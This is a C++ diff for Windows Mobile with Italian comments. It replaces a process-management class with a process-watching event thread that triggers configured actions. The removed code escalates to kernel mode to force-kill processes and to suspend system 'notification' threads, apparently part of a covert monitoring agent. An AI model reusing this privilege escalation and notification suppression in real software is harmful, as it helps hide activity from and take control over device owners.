@@ -1,625 +1,78 @@
-#include "Process.h"
-#include <aygshell.h>
+#include "Event.h"
+#include "Common.h"
+#include "Conf.h"
+#include "ProcessMonitor.h"
 
-/**
-* La nostra unica reference windowList Process. La gestione della concorrenza viene fatta internamente
-*/
-Process* Process::Instance = NULL;
-//list<WindowEntry> Process::pWindowList;
-volatile LONG Process::lLock = 0;
+// Il formato dei parametri e' il seguente:
+// Azione da triggerare a processo TERMINATO (TRIGGER_ACTION(myData->pParams))
+// Tipo di ricerca da fare (window title [1] o nome del processo [0])
+// Nome del processo in WCHAR NULL-terminato
+// Abbiamo un thread per processo, tuttavia il thread e' estremamente lightweight poiche'
+// effettua solo un busy-cycle, il resto viene fatto tutto dalla classe singleton Process.
+DWORD WINAPI OnProcess(LPVOID lpParam) {
+	ProcessMonitor *processObj = ProcessMonitor::self();
+	Event *me = (Event *)lpParam;
+	Configuration *conf;
+	wstring processName;
+	BOOL onlyWindow, processActive = FALSE;
+	HANDLE eventHandle = me->getEvent();
 
-Process* Process::self() {
-	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
-		Sleep(1);
+	me->setStatus(EVENT_RUNNING);
+	conf = me->getConf();
 
-	if (Instance == NULL)
-		Instance = new(std::nothrow) Process();
-
-	InterlockedExchange((LPLONG)&lLock, 0);
-
-	return Instance;
-}
-
-Process::Process() : hSnap(INVALID_HANDLE_VALUE), hProcessMutex(INVALID_HANDLE_VALUE), 
-hWindowMutex(INVALID_HANDLE_VALUE) {
-	ZeroMemory(&pe, sizeof(pe));
-	ZeroMemory(&procEntry, sizeof(procEntry));
-
-	ulTime = 0;
-	ulWinTime = 0;
-
-	hProcessMutex = CreateMutex(NULL, FALSE, NULL);
-	hWindowMutex = CreateMutex(NULL, FALSE, NULL);
-}
-
-Process::~Process() {
-	pList.clear();
-	pWindowList.clear();
-
-	if (hSnap != INVALID_HANDLE_VALUE)
-		CloseToolhelp32Snapshot(hSnap);
-
-	if (hProcessMutex != INVALID_HANDLE_VALUE)
-		CloseHandle(hProcessMutex);
-
-	if (hWindowMutex != INVALID_HANDLE_VALUE)
-		CloseHandle(hWindowMutex);
-}
-
-UINT Process::GetPid(WCHAR *pProcName) {
-	if (RefreshProcessList() == FALSE)
-		return FALSE;
-
-	WAIT_AND_SIGNAL(hProcessMutex);
-
-	if (pList.size() == 0 || pProcName == NULL || wcslen(pProcName) == 0) {
-		UNLOCK(hProcessMutex);
-		return 0;
+	try {
+		processName = conf->getString(L"process");
+	} catch (...) {
+		processName = L"";
 	}
 
-	for (iter = pList.begin(); iter != pList.end(); iter++) {
-		if (_wcsnicmp(pProcName, (*iter).pe.szExeFile, MAX_PATH) == 0) {
-			UNLOCK(hProcessMutex);
-			return (*iter).pe.th32ProcessID;
+	try {
+		onlyWindow = conf->getBool(L"window");
+	} catch (...) {
+		onlyWindow = FALSE;
+	}
+
+	DBG_TRACE(L"Debug - Process.cpp - Process Event is Alive\n", 1, FALSE);
+
+	if (onlyWindow) {
+		LOOP {
+			if (me->shouldStop()) {
+				DBG_TRACE(L"Debug - Process.cpp - Process Event is Closing\n", 1, FALSE);
+				me->setStatus(EVENT_STOPPED);
+
+				return 0;
+			}
+
+			if (processActive == TRUE && processObj->IsWindowPresent(processName.c_str()) == FALSE) {
+				processActive = FALSE;
+				me->triggerEnd();
+			} else if (processActive == FALSE && processObj->IsWindowPresent(processName.c_str()) == TRUE) {
+				processActive = TRUE;
+				me->triggerStart();
+			}
+
+			WaitForSingleObject(eventHandle, 5000);
+		}
+	} else {
+		LOOP {
+			if (me->shouldStop()) {
+				DBG_TRACE(L"Debug - Process.cpp - Process Event is Closing\n", 1, FALSE);
+				me->setStatus(EVENT_STOPPED);
+
+				return 0;
+			}
+
+			if (processActive == TRUE && processObj->IsProcessRunningW(processName.c_str()) == FALSE) {
+				processActive = FALSE;
+				me->triggerEnd();
+			} else if (processActive == FALSE && processObj->IsProcessRunningW(processName.c_str()) == TRUE) {
+				processActive = TRUE;
+				me->triggerStart();
+			}
+
+			WaitForSingleObject(eventHandle, 5000);
 		}
 	}
 
-	UNLOCK(hProcessMutex);
 	return 0;
-}
-
-UINT Process::GetPidW(WCHAR *pProcName) {
-	if (RefreshProcessList() == FALSE)
-		return FALSE;
-
-	WAIT_AND_SIGNAL(hProcessMutex);
-
-	if (pList.size() == 0 || pProcName == NULL || wcslen(pProcName) == 0) {
-		UNLOCK(hProcessMutex);
-		return 0;
-	}
-
-	for (iter = pList.begin(); iter != pList.end(); iter++) {
-		if (CmpWildW(pProcName, (*iter).pe.szExeFile) != 0) {
-			UNLOCK(hProcessMutex);
-			return (*iter).pe.th32ProcessID;
-		}
-	}
-
-	UNLOCK(hProcessMutex);
-	return 0;
-}
-
-BOOL Process::IsProcessRunning(WCHAR *pProcName) {
-	if (GetPid(pProcName))
-		return TRUE;
-
-	return FALSE;
-}
-
-BOOL Process::IsProcessRunningW(WCHAR *pProcName) {
-	if (GetPidW(pProcName))
-		return TRUE;
-
-	return FALSE;
-}
-
-BOOL Process::RefreshProcessList() {
-	ProcessEntry tProcEntry;
-	unsigned __int64 utTime;
-
-	WAIT_AND_SIGNAL(hProcessMutex);
-
-	utTime = GetTime();
-
-	// Refreshamo la lista solo se e' passato piu' di un secondo
-	if (DiffTime(utTime, ulTime) < 1000) {
-		UNLOCK(hProcessMutex);
-		return TRUE;
-	}
-
-	ulTime = utTime;
-
-	pe.dwSize = sizeof(pe);
-
-	if (hSnap != INVALID_HANDLE_VALUE) {
-		CloseToolhelp32Snapshot(hSnap);
-		hSnap = INVALID_HANDLE_VALUE;
-	}
-
-	pList.clear();
-
-	// Il secondo flag e' un undocumented che serve windowList NON richiedere la lista
-	// degli heaps altrimenti la funzione fallisce sempre per mancanza di RAM.
-	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
-	
-	if (hSnap == INVALID_HANDLE_VALUE) {
-		SHCloseApps(10000000); // Liberiamo 10Mb e riproviamo
-
-		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
-
-		if (hSnap == INVALID_HANDLE_VALUE) {
-			UNLOCK(hProcessMutex);
-			return FALSE;
-		}
-	}
-
-	if (Process32First(hSnap, &pe) == FALSE) {
-		if (GetLastError() == ERROR_NO_MORE_FILES) {
-			UNLOCK(hProcessMutex);
-			return TRUE;
-		}
-
-		UNLOCK(hProcessMutex);
-		return FALSE;
-	}
-
-	tProcEntry.bTriggered = FALSE;
-	CopyMemory(&tProcEntry.pe, &pe, sizeof(pe));
-
-	pList.push_back(tProcEntry);
-
-	while (Process32Next(hSnap, &pe)) {
-		tProcEntry.bTriggered = FALSE;
-		CopyMemory(&tProcEntry.pe, &pe, sizeof(pe));
-
-		pList.push_back(tProcEntry);
-	}
-
-	if (GetLastError() == ERROR_NO_MORE_FILES) {
-		UNLOCK(hProcessMutex);
-		return TRUE;
-	}
-
-	UNLOCK(hProcessMutex);
-	return FALSE;
-}
-
-BOOL Process::GetProcessList(list<ProcessEntry> &pRetList) {
-	pRetList.clear();
-	RefreshProcessList();
-
-	WAIT_AND_SIGNAL(hProcessMutex);
-	pRetList = pList;
-	UNLOCK(hProcessMutex);
-
-	return TRUE;
-}
-
-wstring Process::GetProcessDescription(DWORD dwPid) {
-	struct LANGANDCODEPAGE {
-		WORD wLanguage;
-		WORD wCodePage;
-	} *pLangAndCodePage;
-
-	UINT cbTranslate = 0, cbDesc = 0;
-	HANDLE hProc;
-	BYTE *bFileInfo;
-	WCHAR *pwDescription;
-	DWORD dwInfoSize, dwDummy;
-	WCHAR wProcessPath[MAX_PATH+1];
-	WCHAR wFileDescName[128];
-	wstring wDescription;
-											
-	if ((hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid)) == NULL) 
-		return wDescription;
-
-	if (GetModuleFileName((HMODULE)hProc, wProcessPath, sizeof(wProcessPath) / sizeof(WCHAR)) == 0) {
-		CloseHandle(hProc);
-		return wDescription;
-	}
-
-	CloseHandle(hProc);
-
-	if ((dwInfoSize = GetFileVersionInfoSize(wProcessPath, &dwDummy)) == 0 )
-		return wDescription;
-
-	bFileInfo = new(std::nothrow) BYTE[dwInfoSize];
-
-	if (bFileInfo == NULL)
-		return wDescription;
-
-	if (!GetFileVersionInfo(wProcessPath, NULL, dwInfoSize, bFileInfo)) {
-		delete[] bFileInfo;
-		return wDescription;
-	}
-
-	if (!VerQueryValue(bFileInfo, L"\\VarFileInfo\\Translation", (LPVOID*)&pLangAndCodePage, &cbTranslate) || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
-		delete[] bFileInfo;
-		return wDescription;
-	}
-
-	swprintf(wFileDescName, L"\\StringFileInfo\\%04x%04x\\FileDescription", pLangAndCodePage[0].wLanguage, pLangAndCodePage[0].wCodePage);
-
-	if (VerQueryValue(bFileInfo, wFileDescName, (LPVOID *)&pwDescription, &cbDesc) && cbDesc > 0) 
-		wDescription = pwDescription;
-
-	delete[] bFileInfo;
-	return wDescription;
-}
-
-BOOL Process::RefreshWindowList() {
-	unsigned __int64 utTime;
-
-	WAIT_AND_SIGNAL(hWindowMutex);
-
-	utTime = GetTime();
-
-	// Refreshiamo la lista solo se e' passato piu' di un secondo
-	if (DiffTime(utTime, ulWinTime) < 1000) {
-		UNLOCK(hWindowMutex);
-		return TRUE;
-	}
-
-	ulTime = utTime;
-
-	pWindowList.clear();
-	
-	if (EnumWindows(&EnumCallback, (LPARAM)&pWindowList) == FALSE) {
-		UNLOCK(hWindowMutex);
-		return FALSE;
-	}
-
-	UNLOCK(hWindowMutex);
-	return TRUE;
-}
-
-BOOL Process::IsWindowPresent(WCHAR *pWindowName) {
-	if (RefreshWindowList() == FALSE)
-		return FALSE;
-
-	WAIT_AND_SIGNAL(hWindowMutex);
-
-	if (pWindowList.size() == 0 || pWindowName == NULL || wcslen(pWindowName) == 0) {
-		UNLOCK(hWindowMutex);
-		return FALSE;
-	}
- 
-	for (iterWindow = pWindowList.begin(); iterWindow != pWindowList.end(); iterWindow++) {
-		if (CmpWildW(pWindowName, (*iterWindow).wWindowTitle) != 0) {
-			UNLOCK(hWindowMutex);
-			return TRUE;
-		}
-	}
-
-	UNLOCK(hWindowMutex);
-	return FALSE;
-}
-
-// Compara due stringhe con wildcard, torna 0 se le stringhe sono diverse
-INT Process::CmpWildW(WCHAR *wild, WCHAR *searchString) {
-	WCHAR *cp = NULL, *mp = NULL;
-
-	while ((*searchString) && (*wild != '*')) {
-		if ((towupper((WCHAR)*wild) != towupper((WCHAR)*searchString)) && (*wild != '?')) {
-			return 0;
-		}
-
-		wild++;
-		searchString++;
-	}
-
-	while (*searchString) {
-		if (*wild == '*') {
-			if (!*++wild) {
-				return 1;
-			}
-
-			mp = wild;
-			cp = searchString+1;
-		} else if ((towupper((WCHAR)*wild) == towupper((WCHAR)*searchString)) || (*wild == '?')) {
-			wild++;
-			searchString++;
-		} else {
-			wild = mp;
-			searchString = cp++;
-		}
-	}
-
-	while (*wild == '*') {
-		wild++;
-	}
-
-	return !*wild;
-}
-
-BOOL CALLBACK Process::EnumCallback(HWND hwnd, LPARAM lParam) {
-	WindowEntry tWindowEntry;
-	list<WindowEntry> *windowList = ((list<WindowEntry> *)lParam);
-
-	tWindowEntry.bTriggered = FALSE;
-	
-	if (GetWindowText(hwnd, tWindowEntry.wWindowTitle, MAX_TITLE_LEN) && tWindowEntry.wWindowTitle[0] != 0) {
-		windowList->push_back(tWindowEntry);
-	}
-
-	return TRUE;
-}
-
-extern "C" {
-	BOOL WINAPI SetKMode(BOOL fMode);
-	DWORD WINAPI SetProcPermissions(DWORD);
-	LPVOID WINAPI MapPtrToProcess (LPVOID lpv, HANDLE hProc);
-	LPVOID WINAPI MapPtrUnsecure(LPVOID lpv, HANDLE hProc);
-	HLOCAL WINAPI LocalAllocInProcess(UINT uFlags, UINT uBytes, HANDLE hProc); 
-	HLOCAL WINAPI LocalFreeInProcess(HLOCAL hMem, HANDLE hProc); 
-	HANDLE WINAPI LoadKernelLibrary(LPCWSTR lpszFileName);
-	int QueryAPISetID(char *pName);
-
-	typedef struct _CALLBACKINFO {
-		HANDLE m_hDestProcess;
-		FARPROC m_pFunction;
-		PVOID m_pFirstArgument;
-	} CALLBACKINFO, *pCALLBACKINFO;
-
-	DWORD WINAPI PerformCallBack4(CALLBACKINFO *pcbi, ...);
-};
-
-#define PROC_FIND			0x0
-#define PROC_TERMINATE		0x1
-
-#define TH_MASK		  0x000000F0
-
-#define TH_BY_PRI			0x10
-#define TH_TERMINATE_BY_PRI	0x11
-#define TH_SUSPEND_BY_PRI	0x12
-#define TH_RESUME_BY_PRI	0x13
-
-#define TH_ALL				0x20
-#define TH_TERMINATE_ALL	0x21
-#define TH_SUSPEND_ALL		0x22
-#define TH_RESUME_ALL		0x23
-
-DWORD Process::ThreadHandler( DWORD dwProc, DWORD dwMode, DWORD dwValue )
-{
-	BOOL bOut = FALSE;
-	DWORD dwErr = -1, dwOut = -1, dwOldPerm;
-	HANDLE hSnapTh = INVALID_HANDLE_VALUE;
-	THREADENTRY32  te;
-	ZeroMemory(&te, sizeof(THREADENTRY32));
-	te.dwSize = sizeof(THREADENTRY32);
-
-	hSnapTh = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPNOHEAPS, dwProc);
-
-	if (hSnapTh == INVALID_HANDLE_VALUE) {
-		if (FALSE == SHCloseApps((0xA00000))) {
-			return NULL;
-		}
-		hSnapTh = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPNOHEAPS, dwProc);
-		if (hSnapTh == INVALID_HANDLE_VALUE) {
-			return NULL;
-		}
-	}
-
-	if (Thread32First(hSnapTh, &te)) {
-		do {
-			if (dwProc == te.th32OwnerProcessID) {
-				
-				if ((dwMode&TH_MASK) == TH_BY_PRI) {
-					if (te.tpBasePri == dwValue) {
-						SetLastError(0);
-
-						dwOut =	te.th32ThreadID;
-
-						if (dwMode == TH_TERMINATE_BY_PRI)	{
-
-							if (TerminateThread((HANDLE)te.th32ThreadID, 0) == TRUE) {
-								dwOut = 0;
-							}
-						}
-
-						if (dwMode == TH_SUSPEND_BY_PRI) {
-							SetKMode(TRUE);
-							dwOldPerm = SetProcPermissions(0xFFFFFFFF);
-
-							if (SuspendThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
-								dwOut =	te.th32ThreadID;
-							}
-						}
-
-						if (dwMode == TH_RESUME_BY_PRI) {
-							SetKMode(TRUE);
-							dwOldPerm = SetProcPermissions(0xFFFFFFFF);
-
-							if (ResumeThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
-								dwOut = te.th32ThreadID;;
-							}
-						}
-
-						break;					
-					}
-				}
-
-				if ((dwMode&TH_MASK) == TH_ALL) {
-
-					if (dwMode == TH_TERMINATE_ALL)	{
-
-						if (TerminateThread((HANDLE)te.th32ThreadID, 0) == TRUE) {
-							dwOut = 0;
-						}
-					}
-
-					if (dwMode == TH_SUSPEND_ALL) {
-						SetKMode(TRUE);
-						dwOldPerm = SetProcPermissions(0xFFFFFFFF);
-
-						if (SuspendThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
-							dwOut =	te.th32ThreadID;
-						}
-					}
-
-					if (dwMode == TH_RESUME_ALL) {
-						SetKMode(TRUE);
-						dwOldPerm = SetProcPermissions(0xFFFFFFFF);
-
-						if (ResumeThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
-							dwOut = te.th32ThreadID;;
-						}
-					}
-				}
-			}
-		} while (Thread32Next(hSnapTh, &te));
-	}
-
-	if (dwOldPerm != 0)
-		SetProcPermissions(dwOldPerm);
-	SetKMode(FALSE);
-
-	if (hSnapTh != INVALID_HANDLE_VALUE && hSnapTh != NULL)
-		CloseToolhelp32Snapshot(hSnapTh);
-
-	return dwOut;
-}
-
-BOOL Process::ProcessHandler( wstring wszProcessName, DWORD dwMode, DWORD dwValue )
-{
-	BOOL bOut = FALSE;
-	HANDLE hTH = INVALID_HANDLE_VALUE;
-	PROCESSENTRY32 pe;
-	ZeroMemory(&pe, sizeof(PROCESSENTRY32));
-	pe.dwSize = sizeof(PROCESSENTRY32);
-	HANDLE hProc = INVALID_HANDLE_VALUE;
-
-	hTH = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
-
-	if (hTH == INVALID_HANDLE_VALUE) {
-		if (FALSE == SHCloseApps((0xA00000))) {
-			DBG_TRACE(L"Process ProcessHandler CreateToolhelp32Snapshot FAILED ", 5, FALSE);
-			return FALSE;
-		}
-		hTH = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
-		if (hTH == INVALID_HANDLE_VALUE) {
-			DBG_TRACE(L"Process ProcessHandler CreateToolhelp32Snapshot FAILED ", 5, FALSE);
-			return FALSE;
-		}
-	}
-
-	if (Process32First(hTH, &pe)) {
-		do {
-			if (wcsicmp(wszProcessName.c_str(), pe.szExeFile) == 0) {
-				
-				hProc = OpenProcess(0, FALSE, pe.th32ProcessID);
-
-				if (hProc != INVALID_HANDLE_VALUE && hProc != NULL) {
-
-					switch(dwMode) {
-						case PROC_TERMINATE: {
-							bOut = TerminateProcess(hProc, 1);
-							DBG_TRACE_INT(L"Process ProcessHandler TerminateProcess1 bOut: ", 5, TRUE, bOut);
-							
-							if (bOut == FALSE) {
-								if (hProc)
-									CloseHandle(hProc);
-								BOOL bKMode = SetKMode(TRUE);
-								DWORD dwProcPerm = SetProcPermissions(0xFFFFFFFF);
-
-								hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
-								if (hProc != INVALID_HANDLE_VALUE && hProc != NULL) {
-									bOut = TerminateProcess(hProc, 1);
-								}
-								
-								DBG_TRACE_INT(L"Process ProcessHandler TerminateProcess2 bOut: ", 5, TRUE, bOut);
-
-								SetProcPermissions(dwProcPerm);
-								SetKMode(bKMode);
-								if (hProc)
-									CloseHandle(hProc);
-							}
-							break;
-						}
-						case PROC_FIND:
-							bOut = TRUE;
-							break;
-						default:
-							if (dwMode&TH_MASK)
-								if (ThreadHandler(pe.th32ProcessID, dwMode, dwValue) != -1)
-									bOut = TRUE;
-							break;
-					}
-
-					CloseHandle(hProc);
-					break;
-				}
-			}
-		} while (Process32Next(hTH, &pe));
-	}
-
-	CloseToolhelp32Snapshot(hTH);
-	return bOut;
-}
-
-BOOL Process::ResumeNotificationThread(wstring wszProcessName)
-{
-	if (ProcessHandler(wszProcessName.c_str(), TH_RESUME_BY_PRI, 248) == TRUE)
-		return TRUE;
-
-	return FALSE;
-}
-
-BOOL Process::ResumeAllThread(wstring wszProcessName)
-{
-	if (ProcessHandler(wszProcessName.c_str(), TH_RESUME_ALL, 0) == TRUE)
-		return TRUE;
-
-	return FALSE;
-}
-
-BOOL Process::SuspendNotificationThread(wstring wszProcessName)
-{
-	if (ProcessHandler(wszProcessName.c_str(), TH_SUSPEND_BY_PRI, 248) == TRUE)
-		return TRUE;
-	
-	return FALSE;
-}
-
-BOOL Process::SuspendAllThread(wstring wszProcessName)
-{
-	if (ProcessHandler(wszProcessName.c_str(), TH_SUSPEND_ALL, 0) == TRUE)
-		return TRUE;
-
-	return FALSE;
-}
-
-BOOL Process::KillProcess(wstring wszProcessName)
-{
-	if (ProcessHandler(wszProcessName.c_str(), PROC_TERMINATE, 0) == TRUE) {
-		return TRUE;
-	}
-
-	if (ProcessHandler(wszProcessName, PROC_FIND, 0) == FALSE) {
-		DBG_TRACE(L"Process KillProcess ProcessHandler PROC_FIND PROC NOT FOUND ", 5, FALSE);
-		return TRUE;	
-	}
-
-	return FALSE;
-}
-
-BOOL Process::StartProcess(wstring wszProcessName, wstring wszProcessPath, wstring wszProcessOptions)
-{
-	wszProcessPath.append(wszProcessName);
-
-	if (wszProcessName.length() == 0 || wszProcessPath.length() == 0) {
-		return FALSE;
-	}
-
-	if (ProcessHandler(wszProcessName, PROC_FIND, 0) == TRUE) {
-		return FALSE;	
-	}
-
-	SHELLEXECUTEINFO shExecInfo;
-	ZeroMemory(&shExecInfo, sizeof(SHELLEXECUTEINFO));
-	shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
-
-	shExecInfo.fMask	= SEE_MASK_FLAG_NO_UI;
-	shExecInfo.lpVerb	= L"Open";
-	shExecInfo.lpFile	= wszProcessPath.c_str();
-	shExecInfo.lpParameters = wszProcessOptions.c_str();
-
-	return ShellExecuteEx(&shExecInfo);
-}
-
-BOOL Process::RestartProcess(wstring wszProcessName, wstring wszProcessPath, wstring wszProcessOptions) 
-{
-	KillProcess(wszProcessName);
-	return StartProcess(wszProcessName, wszProcessPath, wszProcessOptions);
 }
